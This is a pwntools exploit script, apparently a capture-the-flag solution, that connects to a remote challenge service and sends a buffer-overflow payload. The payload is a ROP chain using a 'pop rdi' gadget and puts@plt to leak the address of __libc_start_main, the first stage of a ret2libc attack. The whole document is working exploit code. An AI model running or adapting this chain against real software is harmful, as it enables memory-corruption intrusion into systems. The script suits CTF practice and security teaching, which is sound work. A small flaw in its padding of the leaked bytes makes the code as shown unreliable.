from pwn import *

# p = process('./vuln')
p = remote('ctf99.cs.ui.ac.id', 9130)
elf = ELF("./vuln")
rop = ROP(elf)

PUTS = elf.plt['puts']
LIBC_START_MAIN = elf.symbols['__libc_start_main']
POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0] # Same as ROPgadget --binary vuln | grep "pop rdi"

log.info("puts@plt: " + hex(PUTS))
log.info("__libc_start_main: " + hex(LIBC_START_MAIN))
log.info("pop rdi gadget: " + hex(POP_RDI))

base = b"A" * 32 + b"B"

rop = base + p64(POP_RDI) + p64(LIBC_START_MAIN) +  p64(PUTS)

#Send our rop-chain payload
p.sendlineafter("ROP.", rop)

#Parse leaked address
print(p.recvline())
print(p.recvline())
recieved = p.recvline().strip()
print(recieved)
leak = u64(recieved.ljust(8, "\x00"))
log.info("Leaked libc address,  __libc_start_main: %s" % hex(leak))

p.close()